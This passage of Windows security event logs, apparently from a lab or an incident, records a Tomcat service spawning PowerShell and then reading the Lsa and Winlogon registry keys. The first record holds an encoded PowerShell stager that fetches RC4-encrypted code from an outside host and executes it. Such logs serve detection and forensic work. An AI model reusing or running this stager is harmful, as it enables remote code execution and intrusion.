cALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQB4AEEARABrAEEATQBnAEEAdQBBAEQARQBBAE4AZwBBADQAQQBDADQAQQBNAHcAQQB1AEEARABVAEEATwBnAEEAMABBAEQAUQBBAE0AdwBBAD0AJwApACkAKQA7ACQAdAA9ACcALwBuAGUAdwBzAC4AcABoAHAAJwA7ACQAdwBjAC4ASABlAGEAZABlAHIAcwAuAEEAZABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAdwBjAC4AUAByAG8AeAB5AD0AWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBEAGUAZgBhAHUAbAB0AFcAZQBiAFAAcgBvAHgAeQA7ACQAdwBjAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzACAAPQAgAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQATgBlAHQAdwBvAHIAawBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQAdwBjAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAQgB5AHQAZQBzACgAJwBYAGYAUwBWAEIAOwBbAEkASwAzAGUALQBnAHQAagBUACMAXgB6AEwANABEAF8APABFAC8ALgB2AHIAbwA9AE8AJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AdQBuAHQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgB4AG8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAGwAWAB4AGMAQgBkAD0AdgBxAHcAdQBpAG8AagBTAC8AUQBjAGUAaQBMAE4AZABIAFcAdABaAGcAeQBWACsARABwAFkAPQAiACkAOwAkAGQAYQB0AGEAPQAkAHcAYwAuAEQAbwB3AG4AbABvAGEAZABEAGEAdABhACgAJABzAGUAcgArACQAdAApADsAJABpAHYAPQAkAGQAYQB0AGEAWwAwAC4ALgAzAF0AOwAkAGQAYQB0AGEAPQAkAGQAYQB0AGEAWwA0AC4ALgAkAGQAYQB0AGEALgBsAGUAbgBnAHQAaABdADsALQBqAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAYQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==", "MandatoryLabel": "S-1-16-16384", "NewProcessId": "0x824", "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ParentProcessName": "C:\\ProgramData\\chocolatey\\lib\\Tomcat\\tools\\apache-tomcat-9.0.62\\bin\\tomcat9.exe", "Process": "powershell.exe", "ProcessId": "0xf60", "SubjectAccount": "NT AUTHORITY\\LOCAL SERVICE", "SubjectDomainName": "NT AUTHORITY", "SubjectLogonId": "0x3e5", "SubjectUserName": "LOCAL SERVICE", "SubjectUserSid": "S-1-5-19", "TargetAccount": "-\\-", "TargetDomainName": "-", "TargetLogonId": "0x0", "TargetUserName": "-", "TargetUserSid": "S-1-0-0", "TokenElevationType": "%%1936", "SourceComputerId": "29acc230-2f13-49db-9ef2-c9b20229a10d", "EventOriginId": "29acc230-2f13-49db-9ef2-c9b20229a10c", "MG": "00000000-0000-0000-0000-000000000001", "TimeCollected": "2025-09-12T08:54:37.935Z", "ManagementGroupName": "AOI-redacted", "Type": "SecurityEvent", "_ResourceId": "/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId": "redacted", "TimeGenerated": "2025-09-12T08:54:08.503Z", "SourceSystem": "OpsManager", "Computer": "WORKSTATION5", "EventSourceName": "Microsoft-Windows-Security-Auditing", "Channel": "Security", "Task": 1, "Level": "0", "EventData": "<EventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\r\n  <Data Name=\"SubjectUserSid\">S-1-5-19</Data>\r\n  <Data Name=\"SubjectUserName\">LOCAL SERVICE</Data>\r\n  <Data Name=\"SubjectDomainName\">NT AUTHORITY</Data>\r\n  <Data Name=\"SubjectLogonId\">0x3e5</Data>\r\n  <Data Name=\"ObjectServer\">Security</Data>\r\n  <Data Name=\"ObjectType\">Key</Data>\r\n  <Data Name=\"ObjectName\">\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa</Data>\r\n  <Data Name=\"HandleId\">0x260</Data>\r\n  <Data Name=\"TransactionId\">{00000000-0000-0000-0000-000000000000}</Data>\r\n  <Data Name=\"AccessList\">%%4432 \t\t\t\t</Data>\r\n  <Data Name=\"AccessReason\">-</Data>\r\n  <Data Name=\"AccessMask\">0x1</Data>\r\n  <Data Name=\"PrivilegeList\">-</Data>\r\n  <Data Name=\"RestrictedSidCount\">0</Data>\r\n  <Data Name=\"ProcessId\">0x824</Data>\r\n  <Data Name=\"ProcessName\">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>\r\n  <Data Name=\"ResourceAttributes\">-</Data>\r\n</EventData>", "EventID": 4656, "Activity": "4656 - A handle to an object was requested.", "SourceComputerId": "29acc230-2f13-49db-9ef2-c9b20229a10d", "EventOriginId": "29acc230-2f13-49db-9ef2-c9b20229a10c", "MG": "00000000-0000-0000-0000-000000000001", "TimeCollected": "2025-09-12T08:54:37.935Z", "ManagementGroupName": "AOI-redacted", "Type": "SecurityEvent", "_ResourceId": "/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId": "redacted", "TimeGenerated": "2025-09-12T08:54:08.503Z", "SourceSystem": "OpsManager", "Account": "NT AUTHORITY\\LOCAL SERVICE", "AccountType": "Machine", "Computer": "WORKSTATION5", "EventSourceName": "Microsoft-Windows-Security-Auditing", "Channel": "Security", "Task": 1, "Level": "0", "EventID": 4688, "Activity": "4688 - A new process has been created.", "CommandLine": "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1", "MandatoryLabel": "S-1-16-16384", "NewProcessId": "0x2e04", "NewProcessName": "C:\\Windows\\System32\\conhost.exe", "ParentProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "Process": "conhost.exe", "ProcessId": "0x824", "SubjectAccount": "NT AUTHORITY\\LOCAL SERVICE", "SubjectDomainName": "NT AUTHORITY", "SubjectLogonId": "0x3e5", "SubjectUserName": "LOCAL SERVICE", "SubjectUserSid": "S-1-5-19", "TargetAccount": "-\\-", "TargetDomainName": "-", "TargetLogonId": "0x0", "TargetUserName": "-", "TargetUserSid": "S-1-0-0", "TokenElevationType": "%%1936", "SourceComputerId": "29acc230-2f13-49db-9ef2-c9b20229a10d", "EventOriginId": "29acc230-2f13-49db-9ef2-c9b20229a10c", "MG": "00000000-0000-0000-0000-000000000001", "TimeCollected": "2025-09-12T08:54:37.935Z", "ManagementGroupName": "AOI-redacted", "Type": "SecurityEvent", "_ResourceId": "/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId": "redacted", "TimeGenerated": "2025-09-12T08:54:08.503Z", "SourceSystem": "OpsManager", "Account": "NT AUTHORITY\\LOCAL SERVICE", "AccountType": "Machine", "Computer": "WORKSTATION5", "EventSourceName": "Microsoft-Windows-Security-Auditing", "Channel": "Security", "Task": 1, "Level": "0", "EventData": "<EventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\r\n  <Data Name=\"SubjectUserSid\">S-1-5-19</Data>\r\n  <Data Name=\"SubjectUserName\">LOCAL SERVICE</Data>\r\n  <Data Name=\"SubjectDomainName\">NT AUTHORITY</Data>\r\n  <Data Name=\"SubjectLogonId\">0x3e5</Data>\r\n  <Data Name=\"ObjectServer\">Security</Data>\r\n  <Data Name=\"ObjectType\">Key</Data>\r\n  <Data Name=\"ObjectName\">\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa</Data>\r\n  <Data Name=\"HandleId\">0x260</Data>\r\n  <Data Name=\"AccessList\">%%4432 \t\t\t\t</Data>\r\n  <Data Name=\"AccessMask\">0x1</Data>\r\n  <Data Name=\"ProcessId\">0x824</Data>\r\n  <Data Name=\"ProcessName\">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>\r\n  <Data Name=\"ResourceAttributes\">-</Data>\r\n</EventData>", "EventID": 4663, "Activity": "4663 - An attempt was made to access an object.", "AccessList": "%%4432 \t\t\t\t", "AccessMask": "0x1", "HandleId": "0x260", "ObjectName": "\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa", "ObjectServer": "Security", "ObjectType": "Key", "Process": "powershell.exe", "ProcessId": "0x824", "ProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "SubjectAccount": "NT AUTHORITY\\LOCAL SERVICE", "SubjectDomainName": "NT AUTHORITY", "SubjectLogonId": "0x3e5", "SubjectUserName": "LOCAL SERVICE", "SubjectUserSid": "S-1-5-19", "SourceComputerId": "29acc230-2f13-49db-9ef2-c9b20229a10d", "EventOriginId": "29acc230-2f13-49db-9ef2-c9b20229a10c", "MG": "00000000-0000-0000-0000-000000000001", "TimeCollected": "2025-09-12T08:54:37.935Z", "ManagementGroupName": "AOI-redacted", "Type": "SecurityEvent", "_ResourceId": "/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId": "redacted", "TimeGenerated": "2025-09-12T08:54:08.553Z", "SourceSystem": "OpsManager", "Computer": "WORKSTATION5", "EventSourceName": "Microsoft-Windows-Security-Auditing", "Channel": "Security", "Task": 1, "Level": "0", "EventData": "<EventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\r\n  <Data Name=\"SubjectUserSid\">S-1-5-19</Data>\r\n  <Data Name=\"SubjectUserName\">LOCAL SERVICE</Data>\r\n  <Data Name=\"SubjectDomainName\">NT AUTHORITY</Data>\r\n  <Data Name=\"SubjectLogonId\">0x3e5</Data>\r\n  <Data Name=\"ObjectServer\">Security</Data>\r\n  <Data Name=\"ObjectType\">Key</Data>\r\n  <Data Name=\"ObjectName\">\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WSMAN</Data>\r\n  <Data Name=\"HandleId\">0x384</Data>\r\n  <Data Name=\"TransactionId\">{00000000-0000-0000-0000-000000000000}</Data>\r\n  <Data Name=\"AccessList\">%%1538 \t\t\t\t%%4432 \t\t\t\t%%4435 \t\t\t\t%%4436 \t\t\t\t</Data>\r\n  <Data Name=\"AccessReason\">-</Data>\r\n  <Data Name=\"AccessMask\">0x20019</Data>\r\n  <Data Name=\"PrivilegeList\">-</Data>\r\n  <Data Name=\"RestrictedSidCount\">0</Data>\r\n  <Data Name=\"ProcessId\">0x824</Data>\r\n  <Data Name=\"ProcessName\">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>\r\n  <Data Name=\"ResourceAttributes\">-</Data>\r\n</EventData>", "EventID": 4656, "Activity": "4656 - A handle to an object was requested.", "SourceComputerId": "29acc230-2f13-49db-9ef2-c9b20229a10d", "EventOriginId": "29acc230-2f13-49db-9ef2-c9b20229a10c", "MG": "00000000-0000-0000-0000-000000000001", "TimeCollected": "2025-09-12T08:54:37.935Z", "ManagementGroupName": "AOI-redacted", "Type": "SecurityEvent", "_ResourceId": "/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId": "redacted", "TimeGenerated": "2025-09-12T08:54:08.807Z", "SourceSystem": "OpsManager", "Computer": "WORKSTATION5", "EventSourceName": "Microsoft-Windows-Security-Auditing", "Channel": "Security", "Task": 1, "Level": "0", "EventData": "<EventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\r\n  <Data Name=\"SubjectUserSid\">S-1-5-19</Data>\r\n  <Data Name=\"SubjectUserName\">LOCAL SERVICE</Data>\r\n  <Data Name=\"SubjectDomainName\">NT AUTHORITY</Data>\r\n  <Data Name=\"SubjectLogonId\">0x3e5</Data>\r\n  <Data Name=\"ObjectServer\">Security</Data>\r\n  <Data Name=\"ObjectType\">Key</Data>\r\n  <Data Name=\"ObjectName\">\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon</Data>\r\n  <Data Name=\"HandleId\">0x548</Data>\r\n  <Data Name=\"TransactionId\">{00000000-0000-0000-0000-000000000000}</Data>\r\n  <Data Name=\"AccessList\">%%1538 \t\t\t\t%%4432 \t\t\t\t%%4435 \t\t\t\t%%4436 \t\t\t\t</Data>\r\n  <Data Name=\"AccessReason\">-</Data>\r\n  <Data Name=\"AccessMask\">0x20019</Data>\r\n  <Data Name=\"PrivilegeList\">-</Data>\r\n  <Data Name=\"RestrictedSidCount\">0</Data>\r\n  <Data Name=\"ProcessId\">0x824</Data>\r\n  <Data Name=\"ProcessName\">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>\r\n  <Data Name=\"ResourceAttributes\">-</Data>\r\n</EventData>", "EventID": 4656, "Activity": "4656 - A handle to an object was requested.", "SourceComputerId": "29acc230-2f13-49db-9ef2-c9b20229a10d", "EventOriginId": "29acc230-2f13-49db-9ef2-c9b20229a10c", "MG": "00000000-0000-0000-0000-000000000001", "TimeCollected": "2025-09-12T08:54:37.935Z", "ManagementGroupName": "AOI-redacted", "Type": "SecurityEvent", "_ResourceId": "/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId": "redacted", "TimeGenerated": "2025-09-12T08:54:08.807Z", "SourceSystem": "OpsManager", "Account": "NT AUTHORITY\\LOCAL SERVICE", "AccountType": "Machine", "Computer": "WORKSTATION5", "EventSourceName": "Microsoft-Windows-Security-Auditing", "Channel": "Security", "Task": 1, "Level": "0", "EventData": "<EventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\r\n  <Data Name=\"SubjectUserSid\">S-1-5-19</Data>\r\n  <Data Name=\"SubjectUserName\">LOCAL SERVICE</Data>\r\n  <Data Name=\"SubjectDomainName\">NT AUTHORITY</Data>\r\n  <Data Name=\"SubjectLogonId\">0x3e5</Data>\r\n  <Data Name=\"ObjectServer\">Security</Data>\r\n  <Data Name=\"ObjectType\">Key</Data>\r\n  <Data Name=\"ObjectName\">\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon</Data>\r\n  <Data Name=\"HandleId\">0x548</Data>\r\n  <Data Name=\"AccessList\">%%4432 \t\t\t\t</Data>\r\n  <Data Name=\"AccessMask\">0x1</Data>\r\n  <Data Name=\"ProcessId\">0x824</Data>\r\n  <Data Name=\"ProcessName\">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>\r\n  <Data Name=\"ResourceAttributes\">-</Data>\r\n</EventData>", "EventID": 4663, "Activity": "4663 - An attempt was made to access an object.", "AccessList": "%%4432 \t\t\t\t", "AccessMask": "0x1", "HandleId": "0x548", "ObjectName": "\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "ObjectServer": "Security", "ObjectType": "Key", "Process": "powershell.exe", "ProcessId": "0x824", "ProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "SubjectAccount": "NT AUTHORITY\\LOCAL SERVICE", "SubjectDomainName": "NT AUTHORITY", "SubjectLogonId": "0x3e5", "SubjectUserName": "LOCAL SERVICE", "SubjectUserSid": "S-1-5-19", "SourceComputerId": "29acc230-2f13-49db-9ef2-c9b20229a10d", "EventOriginId": "29acc230-2f13-49db-9ef2-c9b20229a10c", "MG": "00000000-0000-0000-0000-000000000001", "TimeCollected": "2025-09-12T08:54:37.935Z", "ManagementGroupName": "AOI-redacted", "Type": "SecurityEvent", "_ResourceId": "/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId": "redacted", "TimeGenerated": "2025-09-12T08:54:08.807Z", "SourceSystem": "OpsManager", "Computer": "WORKSTATION5", "EventSourceName": "Microsoft-Windows-Security-Auditing", "Channel": "Security", "Task": 1, "Level": "0", "EventData": "<EventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\r\n  <Data Name=\"SubjectUserSid\">S-1-5-19</Data>\r\n  <Data Name=\"SubjectUserName\">LOCAL SERVICE</Data>\r\n  <Data Name=\"SubjectDomainName\">NT AUTHORITY</Data>\r\n  <Data Name=\"SubjectLogonId\">0x3e5</Data>\r\n  <Data Name=\"ObjectServer\">Security</Data>\r\n  <Data Name=\"ObjectType\">Key</Data>\r\n  <Data Name=\"ObjectName\">\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon</Data>\r\n  <Data Name=\"HandleId\">0x598</Data>\r\n  <Data Name=\"TransactionId\">{00000000-0000-0000-0000-000000000000}</Data>\r\n  <Data Name=\"AccessList\">%%1538 \t\t\t\t%%4432 \t\t\t\t%%4435 \t\t\t\t%%4436 \t\t\t\t</Data>\r\n  <Data Name=\"AccessReason\">-</Data>\r\n  <Data Name=\"AccessMask\">0x20019</Data>\r\n  <Data Name=\"PrivilegeList\">-</Data>\r\n  <Data Name=\"RestrictedSidCount\">0</Data>\r\n  <Data Name=\"ProcessId\">0x824</Data>\r\n  <Data Name=\"ProcessName\">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>\r\n  <Data Name=\"ResourceAttributes\">-</Data>\r\n</EventData>", "EventID": 4656, "Activity": "4656 - A handle to an object was requested.", "SourceComputerId": "29acc230-2f13-49db-9ef2-c9b20229a10d", "EventOriginId": "29acc230-2f13-49db-9ef2-c9b20229a10c", "MG": "00000000-0000-0000-0000-000000000001", "TimeCollected": "2025-09-12T08:54:37.935Z", "ManagementGroupName": "AOI-redacted", "Type": "SecurityEvent", "_ResourceId": "/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId": "redacted", "TimeGenerated": "2025-09-12T08:54:08.807Z", "SourceSystem": "OpsManager", "Account": "NT AUTHORITY\\LOCAL SERVICE", "AccountType": "Machine", "Computer": "WORKSTATION5", "EventSourceName": "Microsoft-Windows-Security-Auditing", "Channel": "Security", "Task": 1, "Level": "0", "EventData": "<EventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\r\n  <Data Name=\"SubjectUserSid\">S-1-5-19</Data>\r\n  <Data Name=\"SubjectUserName\">LOCAL SERVICE</Data>\r\n  <Data Name=\"SubjectDomainName\">NT AUTHORITY</Data>\r\n  <Data Name=\"SubjectLogonId\">0x3e5</Data>\r\n  <Data Name=\"ObjectServer\">Security</Data>\r\n  <Data Name=\"ObjectType\">Key</Data>\r\n  <Data Name=\"ObjectName\">\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon</Data>\r\n  <Data Name=\"HandleId\">0x598</Data>\r\n  <Data Name=\"AccessList\">%%4432 \t\t\t\t</Data>\r\n  <Data Name=\"AccessMask\">0x1</Data>\r\n  <Data Name=\"ProcessId\">0x824</Data>\r\n  <Data Name=\"ProcessName\">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>\r\n  <Data Name=\"ResourceAttributes\">-</Data>\r\n</EventData>", "EventID": 4663, "Activity": "4663 - An attempt was made to access an object.", "AccessList": "%%4432 \t\t\t\t", "AccessMask": "0x1", "HandleId": "0x598", "ObjectName": "\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "ObjectServer": "Security", "ObjectType": "Key", "Process": "powershell.exe", "ProcessId": "0x824", "ProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "SubjectAccount": "NT AUTHORITY\\LOCAL SERVICE", "SubjectDomainName": "NT AUTHORITY", "SubjectLogonId": "0x3e5", "SubjectUserName": "LOCAL SERVICE", "SubjectUserSid": "S-1-5-19", "SourceComputerId": "29acc230-2f13-49db-9ef2-c9b20229a10d", "EventOriginId": "29acc230-2f13-49db-9ef2-c9b20229a10c", "MG": "00000000-0000-0000-0000-000000000001", "TimeCollected": "2025-09-12T08:54:37.935Z", "ManagementGroupName": "AOI-redacted", "Type": "SecurityEvent", "_ResourceId": "/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId": "redacted", "TimeGenerated": "2025-09-12T08:54:08.843Z", "SourceSystem": "OpsManager", "Computer": "WORKSTATION5", "EventSourceName": "Microsoft-Windows-Security-Auditing", "Channel": "Security", "Task": 1, "Level": "0", "EventData": "<EventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\r\n  <Data Name=\"SubjectUserSid\">S-1-5-19</Data>\r\n  <Data Name=\"SubjectUserName\">LOCAL SERVICE</Data>\r\n  <Data Name=\"SubjectDomainName\">NT AUTHORITY</Data>\r\n  <Data Name=\"SubjectLogonId\">0x3e5</Data>\r\n  <Data Name=\"ObjectServer\">Security</Data>\r\n  <Data Name=\"ObjectType\">Key</Data>\r\n  <Data Name=\"ObjectName\">\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa</Data>\r\n  <Data Name=\"HandleId\">0x6a8</Data>\r\n  <Data Name=\"TransactionId\">{00000000-0000-0000-0000-000000000000}</Data>\r\n  <Data Name=\"AccessList\">%%4432 \t\t\t\t</Data>\r\n  <Data Name=\"AccessReason\">-</Data>\r\n  <Data Name=\"AccessMask\">0x1</Data>\r\n  <Data Name=\"PrivilegeList\">-</Data>\r\n  <Data Name=\"RestrictedSidCount\">0</Data>\r\n  <Data Name=\"ProcessId\">0x824</Data>\r\n  <Data Name=\"ProcessName\">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>\r\n  <Data Name=\"ResourceAttributes\">-</Data>\r\n</EventData>", "EventID": 4656, "Activity": "4656 - A handle to an object was requested.", "SourceComputerId": "29acc230-2f13-49db-9ef2-c9b20229a10d", "EventOriginId": "29acc230-2f13-49db-9ef2-c9b20229a10c", "MG": "00000000-0000-0000-0000-000000000001", "TimeCollected": "2025-09-12T08:54:37.935Z", "ManagementGroupName": "AOI-redacted", "Type": "SecurityEvent", "_ResourceId": "/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId": "redacted", "TimeGenerated": "2025-09-12T08:54:08.843Z", "SourceSystem": "OpsManager", "Account": "NT AUTHORITY\\LOCAL SERVICE", "AccountType": "Machine", "Computer": "WORKSTATION5", "EventSourceName": "Microsoft-Windows-Security-Auditing", "Channel": "Security", "Task": 1, "Level": "0", "EventData": "<EventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\r\n  <Data Name=\"SubjectUserSid\">S-1-5-19</Data>\r\n  <Data Name=\"SubjectUserName\">LOCAL SERVICE</Data>\r\n  <Data Name=\"SubjectDomainName\">NT AUTHORITY</Data>\r\n  <Data Name=\"SubjectLogonId\">0x3e5</Data>\r\n  <Data Name=\"ObjectServer\">Security</Data>\r\n  <Data Name=\"ObjectType\">Key</Data>\r\n  <Data Name=\"ObjectName\">\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa</Data>\r\n  <Data Name=\"HandleId\">0x6a8</Data>\r\n  <Data Name=\"AccessList\">%%4432 \t\t\t\t</Data>\r\n  <Data Name=\"AccessMask\">0x1</Data>\r\n  <Data Name=\"ProcessId\">0x824</Data>\r\n  <Data Name=\"ProcessName\">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>\r\n  <Data Name=\"ResourceAttributes\">-</Data>\r\n</EventData>", "EventID": 4663, "Activity": "4663 - An attempt was made to access an object.", "AccessList": "%%4432 \t\t\t\t", "AccessMask": "0x1", "HandleId": "0x6a8", "ObjectName": "\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa", "ObjectServer": "Security", "ObjectType": "Key", "Process": "powershell.exe", "ProcessId": "0x824", "ProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "SubjectAccount": "NT AUTHORITY\\LOCAL SERVICE", "SubjectDomainName": "NT AUTHORITY", "SubjectLogonId": "0x3e5", "SubjectUserName": "LOCAL SERVICE", "SubjectUserSid": "S-1-5-19", "SourceComputerId": "29acc230-2f13-49db-9ef2-c9b20229a10d", "EventOriginId": "29acc230-2f13-49db-9ef2-c9b20229a10c", "MG": "00000000-0000-0000-0000-000000000001", "TimeCollected": "2025-09-12T08:54:37.935Z", "ManagementGroupName": "AOI-redacted", "Type": "SecurityEvent", "_ResourceId": "/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
